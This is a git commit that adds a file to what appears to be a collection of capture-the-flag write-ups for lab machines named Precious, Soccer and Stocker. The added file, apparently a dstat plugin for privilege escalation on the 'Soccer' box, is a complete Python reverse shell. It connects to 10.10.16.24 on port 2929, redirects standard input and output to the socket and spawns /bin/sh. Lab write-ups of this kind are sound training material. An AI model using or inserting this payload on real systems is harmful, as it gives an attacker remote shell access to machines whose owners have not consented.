2f6ca7459afc12aacbdd3d189a773a4215cca25e
JarvisScienz <45256819+JarvisScienz@users.noreply.github.com>
2023-05-05 06:35:14 -0400

    Add files via upload
    Writeup Precious, Soccer, Stocker

---
+++ Soccer/dstat_cyberw1ng.py
@@ -0,0 +1,9 @@
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.16.24",2929));
+
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+
+import pty; pty.spawn("/bin/sh")
